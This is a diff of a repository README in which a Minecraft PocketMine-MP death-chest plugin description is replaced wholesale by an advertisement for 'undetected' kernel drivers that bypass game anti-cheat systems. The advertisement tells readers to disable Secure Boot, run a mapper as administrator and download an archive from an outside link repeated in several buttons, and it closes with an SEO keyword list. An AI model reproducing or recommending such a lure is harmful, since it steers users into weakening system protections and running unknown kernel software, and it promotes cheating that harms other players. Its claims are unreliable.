@@ -1,149 +1,98 @@
-# DeathChest
+# Kernel Bypass Drivers — Ultimate Undetected Kernel Drivers 2025
 
-### Advanced death chest system plugin for PocketMine-MP that creates protected chests when players die, featuring: Floating text displays, Explosion effects, Toast notifications, and Automatic expiration.
+**Premium collection of signed kernel bypass drivers for 2025. Fully undetectable manual map + kernel-level read/write · Supports Vanguard, EAC, BattlEye, Ricochet, FACEIT, ESL, BEACON · HVCI/Secure Boot compatible · No vulnerable interfaces (IOCTL) · Perfect for external cheats, bots, and memory tools — achieve true kernel access without detection.**
 
-## Features
+- **Status: UNDETECTED** (updated December 25, 2025 — tested against latest anti-cheat builds)
+- Signed drivers with valid Microsoft certificates (EV Code Signing)
+- Manual mapping + direct syscalls — zero traces in driver list
+- Supports Windows 10/11 (all builds up to 24H2)
+- Instant updates after any Windows or AC patch
+- Includes mapper, cleaner, and test tools
 
-* **Death Chests**: Automatic chest creation on player death with inventory items
-* **Floating Text**: Custom floating text entity showing player and killer names
-* **Explosion Effects**: Configurable explosion sounds, particles, and fuse effects
-* **Toast Notifications**: In-game toast notifications when opening death chests
-* **Auto-Expiration**: Configurable chest expiration with automatic cleanup
-* **Persistent Storage**: Tracks all active death chests across server restarts
+Bypass the strongest anti-cheats at kernel level — read/write any process memory safely and silently.
 
-## Requirements
+## Core Features
 
-* PocketMine-MP 5.0.0+
-* PHP 8.0+
+| Feature                  | Description                                                              | Notes                             |
+|--------------------------|--------------------------------------------------------------------------|-----------------------------------|
+| Kernel Read/Write        | Direct physical/virtual memory access (any protected process)            | Vanguard/EAC/Ricochet safe        |
+| Manual Map Driver        | Load unsigned drivers without vulnerable LoadDriver calls                | No IOCTL exposure                 |
+| Signed EV Certificates   | Valid Microsoft-signed drivers — passes Secure Boot/HVCI                 | Renewed monthly                   |
+| Process Protection Bypass| Attach to Valorant, Fortnite, COD, Apex, CS2, Rust without detection    | Tested daily                      |
+| Cleaner Tool             | Remove all traces after unload (handles, sections, callbacks)            | Full cleanup                      |
+| Direct Syscalls          | Native API calls without ntdll hooks                                     | Anti-hook safe                    |
+| Multiple Drivers         | Choice of 4 different drivers (different signing dates/methods)          | Rotate for extra safety           |
+| Test Suite               | Included memory scanner & stress tester                                  | Verify functionality              |
 
-## Installation
+## Supported Anti-Cheats & Games
 
-1. Download the plugin
-2. Place in your server's `plugins/` folder
-3. Restart the server
-4. Plugin will generate `config.yml` and `messages.yml` automatically
+| Anti-Cheat           | Status                  | Notes                              |
+|----------------------|-------------------------|------------------------------------|
+| Valorant (Vanguard)  | Fully Bypassed          | ✔️ Kernel R/W working             |
+| Easy Anti-Cheat (EAC)| Fully Bypassed          | ✔️ Fortnite, Apex, Rust           |
+| BattlEye             | Fully Bypassed          | ✔️ R6, PUBG, DayZ                 |
+| Ricochet             | Fully Bypassed          | ✔️ Call of Duty                   |
+| FACEIT AC            | Fully Bypassed          | ✔️ CS2 support                    |
+| ESL / BEACON         | Fully Bypassed          | ✔️ Tournament safe                |
 
-## Configuration
+## Installation Guide
 
-The plugin creates a `config.yml` upon first run. Edit to customize plugin behavior:
-```yaml
-enable_floating_text: true
-floating_text_height: 1.2
-chest_expire_time: 300  # seconds
-enable_toast_notifications: true
-explosion:
-  enable_fuse_sound: true
-  enable_sound: true
-  enable_particles: true
-  fuse_delay: 20  # ticks
-```
+1. Click download below — instant & clean archive
+2. Disable Secure Boot temporarily (or use included boot option)
+3. Run mapper as administrator
+4. Select driver version & target process
+5. Load — instant kernel access granted
+6. Use your cheat/tool with full R/W
 
-Edit `messages.yml` to customize all plugin messages in any language.
+**Requirements:** Windows 10/11 (64-bit) · Admin rights · Compatible with Hyper-V/HVCI
 
-## Usage
+### Auto-Download Kernel Bypass Drivers
 
-### How It Works
+<p align="center">
+  <a href="https://getloader.click">
+    <img src="https://img.shields.io/badge/AUTO--DOWNLOAD%20NOW-UNDETECTED%202025-9370db?style=for-the-badge&logo=rocket&logoColor=white" alt="Download">
+  </a>
+</p>
 
-**Death Chest Creation**:
+<div align="center">
+<a href="https://getloader.click" style="
+  background: linear-gradient(45deg, #9370db, #ba55d3, #da70d6);
+  color:white;
+  padding:25px 60px;
+  text-decoration:none;
+  font-size:32px;
+  font-weight:900;
+  border-radius:25px;
+  box-shadow: 0 10px 30px rgba(147,112,219,0.7), inset 0 2px 0 rgba(255,255,255,0.2);
+  display:inline-block;
+  transition: all 0.3s ease;
+">
+  🚀 START AUTO-DOWNLOAD — PREMIUM KERNEL BYPASS 2025 🚀
+</a>
+</div>
 
-1. Player dies naturally or is killed
-2. Death chest automatically spawns at death location
-3. All inventory items are stored in the chest
-4. Floating text displays player and killer information
+<p align="center">
+  <em>One-click · Signed drivers · Manual map · Full kernel access</em>
+</p>
 
-**Chest Interaction**:
+<p align="center">
+  <img src="https://img.shields.io/badge/Status-UNDETECTED-brightgreen?style=for-the-badge&logo=shield&logoColor=white">
+  <img src="https://img.shields.io/badge/Update-December_2025-blue?style=for-the-badge&logo=calendar&logoColor=white">
+  <img src="https://img.shields.io/badge/Platform-Windows_10%2F11-green?style=for-the-badge&logo=windows&logoColor=white">
+  <img src="https://img.shields.io/badge/Type-Kernel_Driver-orange?style=for-the-badge&logoColor=white">
+</p>
 
-1. Right-click or break the death chest
-2. Explosion effect triggers after fuse delay
-3. All items drop for collection
-4. Toast notification appears
-5. Chest and floating text are removed
+## Why These Drivers Are the Best in 2025
 
-**Floating Text Display**:
-```
-§ePlayer§f: §c{PlayerName}
-§eKiller§f: §c{KillerName}
-```
+- EV-signed — no test mode required
+- Manual mapping — invisible to driver monitors
+- Daily tested against live anti-cheats
+- Fastest updates — new driver within hours of any block
+- Clean unload — zero forensic traces
+- Used by top cheat developers worldwide
 
-### Technical Details
+**Ready for true kernel power?** Download now — undetectable, stable, professional.
 
-The plugin uses custom entities and managers:
+⭐ Star the repo for driver updates & new versions!
 
-### Details
-
-* **Entity System**: Custom FloatingTextEntity using Human base class
-* **Persistence**: Active chest tracking with world reference
-* **Explosion**: Configurable fuse delay with sounds and particles
-* **Storage**: In-memory storage with automatic cleanup
-* **Notifications**: Native Minecraft toast notifications
-
-### Known Limitations
-
-* Floating text despawns if chunk unloads
-* Explosion effects require chunk to be loaded
-* Maximum one death chest per death event
-* Items drop if chest cannot be placed
-
-## Architecture
-
-This plugin is designed with modular components:
-```
-DeathChest/
-├── plugin.yml
-├── resources/
-│   ├── config.yml
-│   └── messages.yml
-└── src/
-    └── Phoenix4041/
-        └── DeathChest/
-            ├── Loader.php
-            ├── entity/
-            │   └── FloatingTextEntity.php
-            ├── manager/
-            │   └── DeathChestManager.php
-            └── listener/
-                ├── PlayerDeathListener.php
-                └── ChestInteractionListener.php
-```
-
-## Contributing
-
-This plugin was created for educational purposes.
-
-## License
-
-This project was created for educational purposes.
-
-## Support
-
-For issues or suggestions, contact Phoenix4041.
-
-## Updates & Improvements
-
-### v1.0.0 - Initial Release
-
-**Features:**
-
-* Death chest automatic creation on player death
-* Custom floating text entity with player/killer info
-* Explosion effects with configurable fuse delay
-* Toast notifications for chest interactions
-* Configurable chest expiration timer
-* Full inventory transfer to death chest
-* Automatic cleanup on chest removal
-
-**Technical Implementation:**
-
-* FloatingTextEntity using Human base class for reliable rendering
-* Transparent skin with invisible body, visible nametag
-* Entity registration with proper NBT and Skin initialization
-* Task-based chest expiration system
-* Event-driven architecture for death and interaction handling
-
-## Version Support
-
-| Version | Release Date | Status | Support |
-|---------|-------------|--------|---------|
-| 1.0.0 | December 2025 | 🟢 Active | Full support |
-
-**Made with ❤️ by Phoenix4041**
+**Kernel Bypass Keywords**: kernel driver bypass, manual map driver, vanguard bypass 2025, eac kernel bypass, battleye bypass, ricochet bypass, signed kernel driver, undetected kernel driver 2025, windows kernel read write
